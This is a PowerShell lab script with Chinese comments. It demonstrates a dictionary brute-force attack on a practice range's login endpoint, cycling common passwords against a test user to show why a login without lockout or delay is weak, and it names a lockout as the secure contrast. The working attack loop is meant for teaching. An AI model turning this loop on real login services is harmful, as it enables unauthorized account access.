# scripts/lab-bruteforce.ps1 —— 暴力破解靶场的“攻击脚本”演示
#
# 用途：说明为什么“无锁定 + 无延迟”的登录接口很危险。
# 靶场口令固定为 Lab@123456，这里模拟从字典里逐个试，统计成功率和耗时。
#
# 用法：
#   pwsh -File scripts/lab-bruteforce.ps1
#   pwsh -File scripts/lab-bruteforce.ps1 -BaseUrl http://127.0.0.1:8080 -MaxAttempts 20

param(
    [string]$BaseUrl = "http://127.0.0.1:8080",
    [string]$TargetUser = "labuser",
    [int]$MaxAttempts = 20
)

# 真实攻击会用几十万条的字典；这里只造一个小样本说明原理。
$passwords = @(
    "123456", "password", "admin", "admin123", "qwerty",
    "letmein", "test123", "root", "P@ssw0rd", "changeme",
    "Lab123", "lab123456", "Lab@123", "Lab@1234", "Lab@12345",
    "Lab@123456"
)

$sw = [System.Diagnostics.Stopwatch]::StartNew()
$hit = $null
$tried = 0

foreach ($pwd in $passwords) {
    if ($tried -ge $MaxAttempts) { break }
    $tried++

    $resp = Invoke-WebRequest -Uri "$BaseUrl/lab/bruteforce" -Method Post `
        -Body @{ username = $TargetUser; password = $pwd } -SkipHttpErrorCheck
    $body = $resp.Content

    if ($body -like "*命中口令*") {
        $hit = $pwd
        Write-Host "第 $tried 次命中：$TargetUser / $pwd" -ForegroundColor Green
        break
    }
    Write-Host "第 $tried 次失败：$pwd" -ForegroundColor DarkGray
}

$sw.Stop()

if ($hit) {
    Write-Host ""
    Write-Host ("成功破解口令 {0}，共尝试 {1} 次，耗时 {2:N0} ms" -f $hit, $tried, $sw.ElapsedMilliseconds) -ForegroundColor Green
    Write-Host "说明：接口没有失败计数、没有锁定、没有延迟，攻击成本只取决于字典大小。" -ForegroundColor Yellow
} else {
    Write-Host ""
    Write-Host ("在 {0} 次尝试内未命中（字典里没有正确口令）" -f $tried) -ForegroundColor Yellow
}

Write-Host ""
Write-Host "对照安全实现：POST /auth/login 连续失败 5 次后返回 429 并锁定 15 分钟。" -ForegroundColor Cyan
